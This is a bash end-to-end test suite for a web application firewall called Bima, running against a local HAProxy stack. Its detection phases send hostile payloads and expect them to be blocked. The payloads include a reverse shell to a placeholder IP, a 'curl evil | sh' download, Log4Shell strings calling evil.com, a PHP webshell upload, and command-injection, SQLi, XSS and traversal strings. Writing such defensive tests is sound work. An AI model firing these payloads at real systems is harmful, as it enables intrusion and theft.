#!/usr/bin/env bash
# End-to-end suite for Bima, organised by plan phase. Run from deploy/e2e with
# the stack up (test/e2e/setup.sh). Each scenario uses its own client IP via
# X-Forwarded-For so bans don't interfere. Usage: run.sh [phase...]
set -uo pipefail

H1=${H1:-http://127.0.0.1:18080}      # haproxy  -> bima
H2=${H2:-http://127.0.0.1:18082}      # haproxy2 -> bima2
HTLS=${HTLS:-https://127.0.0.1:18443}
NOTIFY=http://127.0.0.1:18090
M1=http://127.0.0.1:19101; M2=http://127.0.0.1:19102
PROM=http://127.0.0.1:19090; GRAFANA=http://127.0.0.1:13000
MAP=/usr/local/etc/haproxy/bima-blocklist.map
COMPOSE="docker compose"
LOADGEN="$COMPOSE run --rm -T --no-deps --entrypoint /usr/local/bin/loadgen app"
PHASES=${*:-"0 1 2 2b 3 4 5 6 S"}

PASS=0; FAIL=0; FAILED=()
G='\033[32m'; R='\033[31m'; Y='\033[33m'; C='\033[36m'; N='\033[0m'
ok()   { PASS=$((PASS+1)); printf "  ${G}✔${N} %s\n" "$1"; }
bad()  { FAIL=$((FAIL+1)); FAILED+=("[$CUR] $1"); printf "  ${R}✘ %s${N}\n" "$1"; }
phase(){ CUR=$1; printf "\n${C}━━━━ PHASE %s ━━━━${N}\n" "$2"; }
sect() { printf "${Y}▶ %s${N}\n" "$1"; }
want() { [[ " $PHASES " == *" $1 "* ]]; }

code() { # code IP METHOD PATH [curl args...]  (HAProxy 1 unless BASE set)
  local ip=$1 m=$2 p=$3; shift 3
  curl -sk -o /dev/null -w '%{http_code}' --max-time 10 --path-as-is -X "$m" -H "X-Forwarded-For: $ip" "$@" "${BASE:-$H1}$p"
}
expect() { if [[ "$3" == "$2" ]]; then ok "$1 → $3"; else bad "$1: want $2, got $3"; fi; }
check()  { if eval "$2"; then ok "$1"; else bad "$1"; fi; }
runtime(){ # runtime PORT CMD
  exec 3<>/dev/tcp/127.0.0.1/$1; printf '%s\n' "$2" >&3; timeout 2 cat <&3; exec 3>&-
}
in_map() { runtime "${2:-19999}" "show map $MAP" | grep -q " $1 "; }
msgs()   { curl -s $NOTIFY/messages; }
chan_has(){ msgs | jq -r --arg c "$1" '.messages[]|select(.channel==$c)|.text' | grep -qF -- "$2"; }
metric() { # exact series, or sum over all labels when given a bare name
  curl -s "$1/metrics" | awk -v m="$2" '$1==m || (index(m,"{")==0 && index($1,m"{")==1) {s+=$2} END{print s+0}'
}
reset_scores() { $COMPOSE exec -T redis redis-cli --scan --pattern 'bima:*' | grep -v '^bima:bans$' | xargs -r $COMPOSE exec -T redis redis-cli DEL >/dev/null; }
promq()  { curl -s "$PROM/api/v1/query" --data-urlencode "query=$1"; }
wait_until() { # wait_until SECONDS CMD
  local t=$1; shift; for _ in $(seq 1 "$t"); do eval "$*" && return 0; sleep 1; done; return 1
}
agents_healthy() { wait_until 40 '[[ $(curl -s -o /dev/null -w %{http_code} $M1/healthz) == 200 && $(curl -s -o /dev/null -w %{http_code} $M2/healthz) == 200 ]]'; sleep 3; }

# ---------------------------------------------------------------------------
phase 0 "0 — Stack & reset"
$COMPOSE exec -T redis redis-cli FLUSHALL >/dev/null
curl -s -X DELETE $NOTIFY/messages; curl -s -X DELETE $M1/report; curl -s -X DELETE $M2/report
sleep 3   # reconcile clears both maps
check "haproxy → bima → app"      '[[ $(code 198.51.100.1 GET /health) == 200 ]]'
check "haproxy2 → bima2 → app"    '[[ $(BASE=$H2 code 198.51.100.1 GET /health) == 200 ]]'
check "TLS frontend"              '[[ $(BASE=$HTLS code 198.51.100.1 GET /health) == 200 ]]'
check "both agents healthy"       '[[ $(curl -s $M1/healthz) == ok && $(curl -s $M2/healthz) == ok ]]'
check "both blocklist maps empty" '! runtime 19999 "show map $MAP" | grep -q 0x && ! runtime 19998 "show map $MAP" | grep -q 0x'

# ---------------------------------------------------------------------------
if want 1; then
phase 1 "1 — Detection core (signatures + CRS)"
sect "Legit traffic must pass (false-positive check)"
check "GET /"                              '[[ $(code 198.51.100.10 GET /) == 200 ]]'
check "query with & separators"            '[[ $(code 198.51.100.11 GET "/api/users?id=5&sort=asc&page=2") == 200 ]]'
check "JSON with ; & | punctuation"        "[[ \$(code 198.51.100.12 POST /api/notes -H 'Content-Type: application/json' --data '{\"note\":\"hello; see you & bye | ok :) 10*5=50\"}') == 200 ]]"
check "login w/ special-char password (401 from app)" "[[ \$(code 198.51.100.13 POST /login --data-urlencode 'email=a@b.com' --data-urlencode 'password=S3cret!@#\$(x)') == 401 ]]"
check "cookies with ; separators"          "[[ \$(code 198.51.100.14 GET /dashboard -H 'Cookie: session=abc; id=42; theme=dark') == 200 ]]"
check "search 'how to cat a file'"         '[[ $(code 198.51.100.15 GET "/search?q=how+to+cat+a+file+in+linux") == 200 ]]'
printf 'JFIF fake image' > /tmp/bima-photo.jpg
check "image upload"                       "[[ \$(code 198.51.100.16 POST /upload -F 'f=@/tmp/bima-photo.jpg;type=image/jpeg') == 200 ]]"
sect "Attack payloads must be blocked (403)"
expect "cmd injection ;cat /etc/passwd"   403 "$(code 203.0.113.1 GET '/api/ping?host=127.0.0.1;cat%20/etc/passwd')"
expect "cmd injection \$(whoami)"         403 "$(code 203.0.113.2 GET '/api/ping?host=$(whoami)')"
expect "cmd injection double-encoded"     403 "$(code 203.0.113.3 GET '/api/ping?host=1%253Bid')"
expect "cmd injection quote-obfuscated"   403 "$(code 203.0.113.4 GET "/api/ping?host=1;c''at+/etc/hosts")"
expect "cmd injection at end of JSON"     403 "$(code 203.0.113.17 POST /api/notes -H 'Content-Type: application/json' --data '{"note":"hi; whoami"}')"
expect "reverse shell in JSON body"       403 "$(code 203.0.113.5 POST /api/run -H 'Content-Type: application/json' --data '{"cmd":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}')"
expect "base64-wrapped curl|sh"           403 "$(code 203.0.113.6 GET "/api/ping?d=$(printf 'curl http://evil/x.sh | sh' | base64)")"
expect "Log4Shell header"                 403 "$(code 203.0.113.7 GET / -H 'X-Api-Version: ${jndi:ldap://evil.com/a}')"
expect "Log4Shell obfuscated UA"          403 "$(code 203.0.113.8 GET / -A '${${lower:j}${upper:n}${::-d}i:ldap://evil.com/a}')"
expect "Spring4Shell"                     403 "$(code 203.0.113.9 POST /greeting --data 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=x')"
expect "PHP wrapper"                      403 "$(code 203.0.113.10 GET '/index.php?page=php://filter/convert.base64-encode/resource=index')"
expect "SSTI {{7*7}}"                     403 "$(code 203.0.113.11 GET '/hello?name=%7B%7B7*7%7D%7D')"
expect "path traversal ../../etc/passwd"  403 "$(code 203.0.113.12 GET '/download?file=../../../../etc/passwd')"
expect "path traversal %252f in path"     403 "$(code 203.0.113.13 GET '/static/..%252f..%252f..%252fetc%252fpasswd')"
printf '<?php system($_GET["c"]); ?>' > /tmp/bima-shell.php
expect "webshell upload shell.php"        403 "$(code 203.0.113.14 POST /upload -F 'f=@/tmp/bima-shell.php;type=image/png')"
expect "SQLi UNION SELECT (CRS)"          403 "$(code 203.0.113.15 GET "/items?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--")"
expect "XSS <script> (CRS)"               403 "$(code 203.0.113.16 GET '/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E')"
expect "RCE over TLS"                     403 "$(BASE=$HTLS code 203.0.113.18 GET '/api/ping?host=;id')"
expect "RCE via haproxy2/bima2"           403 "$(BASE=$H2 code 203.0.113.19 GET '/api/ping?host=;id')"
fi

# ---------------------------------------------------------------------------
if want 2; then
phase 2 "2 — Enumeration & behaviour"
sect "Scanner User-Agent → tarpit"
start=$(date +%s.%N); c=$(code 203.0.113.60 GET / -A 'sqlmap/1.8.2#stable (https://sqlmap.org)'); dur=$(echo "$(date +%s.%N) - $start" | bc)
expect "sqlmap UA tarpitted" 429 "$c"
check "tarpit held connection ≥1.9s (${dur}s)" "(( \$(echo \"$dur >= 1.9\" | bc) ))"
sect "Directory brute force → ban"
IP=203.0.113.70
for w in admin backup old test dev staging api2 v0 private secret tmp logs cms panel portal db sql files uploads assets2 shop; do code $IP GET "/$w" >/dev/null; done
code $IP GET /.env >/dev/null; code $IP GET /.git/config >/dev/null
expect "after 404 flood + /.env + /.git probes" 403 "$(code $IP GET /)"
check "brute-forcer in haproxy map"  "in_map $IP 19999"
check "brute-forcer in haproxy2 map" "in_map $IP 19998"
sect "ID enumeration (IDOR probing) → ban"
IP=203.0.113.80; first=""
for i in $(seq 1 70); do c=$(code $IP GET "/api/users/$i"); [[ $c == 403 ]] && { first=$i; break; }; done
check "ID enumeration blocked (at id=${first:-never})" '[[ -n $first ]]'
sect "Login brute force → tarpit"
IP=203.0.113.90; codes=()
for i in $(seq 1 22); do codes+=("$(code $IP POST /login --data "email=a@b.c&password=guess$i")"); done
check "brute force tarpitted (last: ${codes[*]: -3})" '[[ " ${codes[*]} " == *" 429 "* ]]'
sect "Allowlist"
expect "allowlisted 10.200.1.1 sending ;id" 200 "$(code 10.200.1.1 GET '/api/ping?host=;id')"
fi

# ---------------------------------------------------------------------------
if want 2b; then
phase 2b "2b — Distributed enumeration (ASN / fingerprint groups)"
sect "12 IPs in AS64501, unique UA each, 8 distinct 404s per IP (per-IP limit is 20)"
for i in $(seq 1 12); do for j in $(seq 1 8); do code 192.0.2.$i GET "/asn-probe-$i-$j" -A "client-$i/1.0" >/dev/null; done; done
sleep 2
n=0; for i in $(seq 1 12); do in_map 192.0.2.$i && n=$((n+1)); done
check "ASN group banned: $n/12 IPs in map" '(( n >= 10 ))'
sect "12 IPs without ASN, same client fingerprint (UA+header order), 8 404s each"
for i in $(seq 1 12); do for j in $(seq 1 8); do code 100.64.0.$i GET "/fp-probe-$i-$j" -A "EvilBot/2.0" -H "X-Scan: 1" >/dev/null; done; done
sleep 2
n=0; for i in $(seq 1 12); do in_map 100.64.0.$i && n=$((n+1)); done
check "fingerprint group banned: $n/12 IPs in map" '(( n >= 10 ))'
sect "Legit users sharing a fingerprint are not affected"
fpok=0; for i in $(seq 1 10); do [[ $(code 198.51.100.$((100+i)) GET /products -A "EvilBot/2.0" -H "X-Scan: 1") == 200 ]] && fpok=$((fpok+1)); done
check "10 IPs with same fingerprint but no 404s still served ($fpok/10)" '(( fpok == 10 ))'
sect "JA3 from TLS ClientHello"
BASE=$HTLS code 198.51.100.20 GET '/api/ping?host=;id' >/dev/null
sleep 1
ja3=$($COMPOSE logs bima 2>/dev/null | grep '"ip":"198.51.100.20"' | grep -o '"ja3":"[0-9a-f]*"' | tail -1)
check "JA3 computed for TLS request ($ja3)" '[[ $ja3 =~ [0-9a-f]{32} ]]'
fi

# ---------------------------------------------------------------------------
if want 3; then
phase 3 "3 — Alerting (Telegram + Discord)"
sleep 7   # > digest interval
J=$(msgs)
tg=$(echo "$J" | jq '[.messages[]|select(.channel=="telegram")]|length'); dc=$(echo "$J" | jq '[.messages[]|select(.channel=="discord")]|length')
check "telegram delivered ($tg)" '(( tg > 0 ))'
check "discord delivered ($dc)"  '(( dc > 0 ))'
expect "telegram messages rejected for bad HTML" 0 "$(echo "$J" | jq .rejected)"
expect "telegram 429 simulated & retried" 1 "$(echo "$J" | jq .rate_limited)"
for kw in "RCE" "LOG4SHELL" "SSTI" "LFI" "ban 20s" "Bima digest" "BIMA-ENUM-104" "AS64500 TEST-NET-3 HOSTING, ID" "DISTRIBUTED-ENUM" "AS64501" "also banned"; do
  for ch in telegram discord; do check "$ch alert contains '$kw'" "chan_has $ch '$kw'"; done
done
n=$(echo "$J" | jq '[.messages[]|select(.channel=="telegram" and (.text|test("203\\.0\\.113\\.70")))]|length')
check "dedup: brute-forcer produced $n telegram msgs (≤3)" '(( n >= 1 && n <= 3 ))'
sect "bima -test-alert (delivery check command)"
out=$($COMPOSE exec -T bima /usr/local/bin/bima -config /etc/bima/config.yaml -test-alert 2>&1)
check "test-alert reports delivered: $(echo $out | tr '\n' ' ')" '[[ $out == *"✔ telegram: delivered"* && $out == *"✔ discord: delivered"* ]]'
check "test alert arrived at telegram & discord" "chan_has telegram BIMA-TEST && chan_has discord BIMA-TEST"
check "test alert payload escaped (&lt;script&gt;)" "chan_has telegram '&lt;script&gt;'"
out=$($COMPOSE exec -T -e BIMA_DISCORD_WEBHOOK= -e BIMA_DISCORD_BOT_TOKEN=test-bot-token -e BIMA_DISCORD_CHANNEL_ID=42 -e BIMA_DISCORD_API_BASE=http://notify:8090/api/v10 \
  bima sh -c 'sed "/webhook/d" /etc/bima/config.yaml > /tmp/c.yaml && /usr/local/bin/bima -config /tmp/c.yaml -test-alert' 2>&1)
check "discord BOT mode (token + channel) delivers: $(echo $out | tr '\n' ' ')" '[[ $out == *"✔ discord: delivered"* ]] && chan_has discord-bot BIMA-TEST'
ok_sent=$(metric $M1 'bima_alerts_sent_total{kind="event",notifier="telegram",status="ok"}')
check "delivery metric bima_alerts_sent_total ok=$ok_sent" '(( ok_sent > 0 ))'
fi

# ---------------------------------------------------------------------------
if want 4; then
phase 4 "4 — Auto-ban: shared state (Redis), multi-HAProxy, persistence"
sect "Attack split across two HAProxy/agent pairs is still detected"
# 24 distinct 404s split 12/12 (each node alone stays under the 20 limit) +
# one sensitive probe per node: only shared counters/score reach the ban (≥80).
IP=203.0.113.120
for i in $(seq 1 24); do if (( i % 2 )); then code $IP GET "/split-$i" >/dev/null; else BASE=$H2 code $IP GET "/split-$i" >/dev/null; fi; done
code $IP GET /.env >/dev/null; BASE=$H2 code $IP GET /.git/config >/dev/null
sleep 1
c1=$(metric $M1 bima_requests_total); c2=$(metric $M2 bima_requests_total)
check "both agents inspected traffic (bima=$c1, bima2=$c2)" '(( c1 > 0 && c2 > 0 ))'
check "split attack banned on both HAProxy maps (needs shared state)" "in_map $IP 19999 && in_map $IP 19998"
expect "banned on node 1" 403 "$(code $IP GET /)"
expect "banned on node 2" 403 "$(BASE=$H2 code $IP GET /)"
sect "Bans survive agent restarts"
$COMPOSE restart bima bima2 >/dev/null 2>&1; agents_healthy
check "ban still in /bans after restart" "curl -s $M1/bans | jq -e 'has(\"$IP\")' >/dev/null"
expect "still blocked after restart" 403 "$(code $IP GET /)"
sect "HAProxy restart: map is empty, reconcile restores bans"
$COMPOSE restart haproxy >/dev/null 2>&1
wait_until 20 "[[ \$(code 198.51.100.1 GET /health) == 200 ]]"
check "ban re-synced into fresh haproxy map" "wait_until 10 'in_map $IP 19999'"
expect "blocked again after haproxy restart" 403 "$(code $IP GET /)"
sect "Ban expiry removes entry from both maps (ladder level 0 = 20s)"
check "ban of 203.0.113.70 expired on both nodes" "wait_until 40 '! in_map 203.0.113.70 19999 && ! in_map 203.0.113.70 19998'"
expect "203.0.113.70 served again" 200 "$(code 203.0.113.70 GET /)"
sect "Escalation ladder: second ban is longer (40s)"
IP=203.0.113.121
code $IP GET '/api/ping?host=;id' >/dev/null; code $IP GET '/api/ping?host=;id' >/dev/null
lvl1=$(curl -s $M1/bans | jq -r --arg ip $IP '.[$ip]'); t1=$(( $(date -d "$lvl1" +%s) - $(date +%s) ))
$COMPOSE exec -T redis redis-cli ZREM bima:bans $IP >/dev/null; sleep 3
code $IP GET '/api/ping?host=;id' >/dev/null; code $IP GET '/api/ping?host=;id' >/dev/null
lvl2=$(curl -s $M1/bans | jq -r --arg ip $IP '.[$ip]'); t2=$(( $(date -d "$lvl2" +%s) - $(date +%s) ))
check "1st ban ≈20s ($t1), 2nd ban ≈40s ($t2)" '(( t1 <= 21 && t2 > 30 ))'
sect "Redis outage → fail-open"
$COMPOSE stop redis >/dev/null 2>&1
expect "legit request with Redis down" 200 "$(code 198.51.100.40 GET /)"
expect "signature blocking works without Redis" 403 "$(code 203.0.113.122 GET '/api/ping?host=;id')"
e=$(metric $M1 bima_store_errors_total)
check "store errors counted ($e)" '(( e > 0 ))'
t=$(curl -s -o /dev/null -w '%{time_total}' -H 'X-Forwarded-For: 198.51.100.41' "$H1/")
check "circuit breaker keeps latency low with Redis down (${t}s)" "(( \$(echo \"$t < 0.05\" | bc) ))"
$COMPOSE start redis >/dev/null 2>&1; sleep 3
fi

# ---------------------------------------------------------------------------
if want 5; then
phase 5 "5 — Shadow mode, FP measurement, tuning"
fpcount() { echo $(( $(metric $M1 'bima_verdicts_total{action="would_block"}') + $(metric $M1 'bima_verdicts_total{action="would_tarpit"}') )); }
corpus()  { $LOADGEN -url http://haproxy:8080 -n 3000 -c 20 -ips 1000 2>/dev/null; }
sect "Shadow mode with the UNTUNED config (baseline)"
BIMA_MODE=detect BIMA_CONFIG=/etc/bima/config.untuned.yaml $COMPOSE up -d bima bima2 >/dev/null 2>&1; agents_healthy
check "mode gauge = detect" "[[ \$(metric $M1 'bima_mode{mode=\"detect\"}') == 1 ]]"
hdr=$(curl -s -D - -o /dev/null -H 'X-Forwarded-For: 203.0.113.150' "$H1/api/ping?host=;id" | tr -d '\r')
check "attack passes in shadow mode (HTTP 200, x-bima-action: allow)" '[[ $hdr == *" 200"* && ${hdr,,} == *"x-bima-action: allow"* ]]'
code 203.0.113.150 GET '/api/ping?host=|uname' >/dev/null; code 203.0.113.150 GET '/api/ping?host=;whoami' >/dev/null
sleep 3
check "no ban placed in shadow mode" "! in_map 203.0.113.150 19999"
check "alert says would-block / would-ban" "chan_has telegram 'WOULD-'"
check "would_block verdicts counted" "(( \$(metric $M1 'bima_verdicts_total{action=\"would_block\"}') > 0 ))"
curl -s -X DELETE $M1/report; b=$(fpcount)
lg=$(corpus); fp0=$(( $(fpcount) - b ))
echo "$lg" | jq -c '.[0]|{n,status}' | sed 's/^/      corpus: /'
rep=$(curl -s $M1/report)
echo "$rep" | jq -r '.rules[]|"      \(.rule) hits=\(.hits) ips=\(.distinct_ips) path=\(.top_paths[0].key) loc=\(.top_locations[0].key) likely_fp=\(.likely_false_positive)"' | head -12
ok "baseline (untuned) false positives: $fp0/3000 ($(echo "scale=2; $fp0*100/3000" | bc)%)"
nsug=$(echo "$rep" | jq '[.rules[]|select(.likely_false_positive)]|length')
check "report suggests exclusions for FP shapes ($nsug rules)" '(( fp0 == 0 || nsug > 0 ))'
echo "$rep" | jq -r '.rules[]|select(.likely_false_positive)|.suggested_exclusion' | head -12 | sed 's/^/      /'
sect "Shadow mode with the TUNED config (exclusions learned from the report)"
BIMA_MODE=detect $COMPOSE up -d bima bima2 >/dev/null 2>&1; agents_healthy
reset_scores   # FP IPs from the baseline run carry score; start the comparison clean
curl -s -X DELETE $M1/report; b=$(fpcount)
corpus >/dev/null; fp1=$(( $(fpcount) - b ))
curl -s $M1/report | jq -r '.rules[]?|select(.blocking>0)|"      still blocking: \(.rule) hits=\(.blocking) path=\(.top_paths[0].key) loc=\(.top_locations[0].key)"' | head
check "tuned false positives: $fp1/3000 (target 0)" '(( fp1 == 0 ))'
sect "Report on a new FP shape (developer bio containing a command)"
curl -s -X DELETE $M1/report
for i in $(seq 1 8); do code 198.51.100.$((60+i)) PUT /api/profile -H 'Content-Type: application/json' --data '{"bio":"I automate stuff: echo hi; whoami"}' >/dev/null; done
check "report marks BIMA-RCE-001 on /api/profile as likely FP" "curl -s $M1/report | jq -e '.rules[]|select(.rule==\"BIMA-RCE-001\" and .likely_false_positive and (.suggested_exclusion|test(\"api/profile\")))' >/dev/null"
sect "ENFORCE with tuned config: exclusions are narrow, attacks still blocked"
BIMA_MODE=enforce $COMPOSE up -d bima bima2 >/dev/null 2>&1; agents_healthy
reset_scores
lg=$(corpus); nb=$(echo "$lg" | jq '[.[0].status["403"],.[0].status["429"]]|map(.//0)|add')
check "benign corpus in enforce mode: $nb/3000 blocked" '(( nb == 0 ))'
expect "snippet with shell cmd on excluded path allowed"   200 "$(code 198.51.100.70 POST /api/snippets -H 'Content-Type: application/json' --data '{"code":"ls -la; cat README"}')"
expect "same payload on another path still blocked"        403 "$(code 203.0.113.160 POST /api/notes -H 'Content-Type: application/json' --data '{"code":"ls -la; cat README"}')"
expect "<script> in product description still blocked"    403 "$(code 203.0.113.161 POST /api/products -H 'Content-Type: application/json' --data '{"description":"<p>hi</p><script>alert(document.cookie)</script>"}')"
expect "onerror XSS in product description still blocked"  403 "$(code 203.0.113.162 POST /api/products -H 'Content-Type: application/json' --data '{"description":"<img src=x onerror=alert(1)>"}')"
expect "command injection in search q still blocked"       403 "$(code 203.0.113.163 GET '/search?q=x;cat%20/etc/passwd')"
expect "path traversal in search q still blocked"          403 "$(code 203.0.113.164 GET '/search?q=../../../../etc/shadow')"
check "exclusions counted in bima_excluded_total ($(metric $M1 bima_excluded_total))" "(( \$(metric $M1 bima_excluded_total) > 0 ))"
fi

# ---------------------------------------------------------------------------
if want 6; then
phase 6 "6 — Enforce + monitoring (Prometheus, Alertmanager, Grafana), latency"
check "mode gauge = enforce" "[[ \$(metric $M1 'bima_mode{mode=\"enforce\"}') == 1 ]]"
sect "Prometheus"
check "all 4 scrape targets up" "wait_until 30 '[[ \$(promq \"sum(up)\" | jq -r \".data.result[0].value[1]\") == 4 ]]'"
check "rules loaded (7 alert rules)" "[[ \$(curl -s $PROM/api/v1/rules | jq '[.data.groups[].rules[]]|length') == 7 ]]"
sect "Grafana dashboard"
check "dashboard 'Bima WAF' provisioned" "wait_until 30 'curl -s -u admin:admin \"$GRAFANA/api/search?query=Bima\" | jq -e \".[0].uid==\\\"bima-waf\\\"\" >/dev/null'"
nexpr=0; nempty=0
while IFS= read -r ex; do
  nexpr=$((nexpr+1)); r=$(promq "$ex")
  [[ $(echo "$r" | jq -r .status) == success ]] || bad "panel query fails: $ex"
  [[ $(echo "$r" | jq '.data.result|length') -gt 0 ]] || nempty=$((nempty+1))
done < <(curl -s -u admin:admin $GRAFANA/api/dashboards/uid/bima-waf | jq -r '.dashboard.panels[].targets[].expr')
check "all $nexpr panel queries valid; $((nexpr-nempty)) return data" '(( nexpr >= 15 && nexpr - nempty >= nexpr - 3 ))'
reset_scores
sect "Latency overhead — simple GET (6000 req, c=20, 1000 IPs, interleaved with bypass)"
lat=$($LOADGEN -url http://haproxy:8080 -bypass http://haproxy:8081 -fixed '/api/users?id=7&q=hello' -n 6000 -c 20 2>/dev/null)
w99=$(echo "$lat" | jq '.[0].p99_ms'); o99=$(echo "$lat" | jq '.[1].p99_ms')
echo "      with Bima: p50=$(echo "$lat" | jq '.[0].p50_ms')ms p95=$(echo "$lat" | jq '.[0].p95_ms')ms p99=${w99}ms | without: p50=$(echo "$lat" | jq '.[1].p50_ms')ms p95=$(echo "$lat" | jq '.[1].p95_ms')ms p99=${o99}ms"
check "all requests 200 ($(echo "$lat" | jq -c '[.[].status]'))" "[[ \$(echo '$lat' | jq -r '[.[].status|keys[]]|unique|join(\",\")') == 200 ]]"
check "simple GET p99 overhead $(echo "$w99 - $o99" | bc)ms < 2ms" "(( \$(echo \"$w99 - $o99 < 2\" | bc) ))"
reset_scores
sect "Latency overhead — realistic corpus (POST JSON/forms/uploads → full CRS)"
lat=$($LOADGEN -url http://haproxy:8080 -bypass http://haproxy:8081 -n 6000 -c 20 2>/dev/null)
w99=$(echo "$lat" | jq '.[0].p99_ms'); o99=$(echo "$lat" | jq '.[1].p99_ms')
echo "      with Bima: p50=$(echo "$lat" | jq '.[0].p50_ms')ms p95=$(echo "$lat" | jq '.[0].p95_ms')ms p99=${w99}ms | without: p50=$(echo "$lat" | jq '.[1].p50_ms')ms p95=$(echo "$lat" | jq '.[1].p95_ms')ms p99=${o99}ms"
check "corpus p99 overhead $(echo "$w99 - $o99" | bc)ms < 10ms (SPOE budget 100ms)" "(( \$(echo \"$w99 - $o99 < 10\" | bc) ))"
fp=$(metric $M1 bima_crs_fastpath_total); tot=$(metric $M1 bima_requests_total)
ok "CRS fast path taken for $fp of $tot requests on bima"
sect "Agent down → Alertmanager → Telegram + Discord"
curl -s -X DELETE $NOTIFY/messages
$COMPOSE stop bima2 >/dev/null 2>&1
expect "fail-open: traffic via haproxy2 still served" 200 "$(BASE=$H2 code 198.51.100.50 GET /)"
hdr=$(curl -s -D - -o /dev/null -H 'X-Forwarded-For: 198.51.100.51' "$H2/" | tr -d '\r' | grep -i x-bima-error)
check "haproxy2 flags uninspected request ($hdr)" '[[ -n $hdr ]]'
check "BimaAgentDown delivered to telegram" "wait_until 120 'chan_has telegram BimaAgentDown'"
check "BimaAgentDown delivered to discord"  "wait_until 20 'chan_has discord BimaAgentDown'"
check "BimaNoAgentInHAProxy delivered"      "wait_until 30 'chan_has telegram BimaNoAgentInHAProxy'"
expect "alertmanager telegram msgs rejected for bad HTML" 0 "$(msgs | jq .rejected)"
$COMPOSE start bima2 >/dev/null 2>&1
check "RESOLVED notification after agent is back" "wait_until 120 'msgs | jq -r \".messages[].text\" | grep -qi resolved'"
expect "attack via haproxy2 blocked again" 403 "$(BASE=$H2 code 203.0.113.170 GET '/api/ping?host=;id')"
fi

# ---------------------------------------------------------------------------
if want S; then
phase S "S — Scenario corpus (attacks, CVE 2023–2026, benign) + behaviour flows via HAProxy"
reset_scores
out=$($COMPOSE run --rm -T --no-deps --entrypoint /usr/local/bin/scenariorun app -url http://haproxy:8080 2>&1); rc=$?
echo "$out" | sed 's/^/      /'
check "scenario runner: $(echo "$out" | grep '^RESULT' )" '(( rc == 0 ))'
sect "Forged X-Forwarded-For flows (own container = own TCP peer; it ends up banned)"
out=$($COMPOSE run --rm -T --no-deps --entrypoint /usr/local/bin/scenariorun app -url http://haproxy:8080 -only spoof 2>&1); rc=$?
echo "$out" | sed 's/^/      /'
check "spoof flows: $(echo "$out" | grep '^RESULT' )" '(( rc == 0 ))'
check "peer flagged as header spoofer (bima_spoofers_total)" "(( \$(metric $M1 bima_spoofers_total) >= 1 ))"
fi

printf "\n════════ RESULT: ${G}%d passed${N}, ${R}%d failed${N} ════════\n" $PASS $FAIL
for f in "${FAILED[@]}"; do printf "  ${R}- %s${N}\n" "$f"; done
(( FAIL == 0 ))
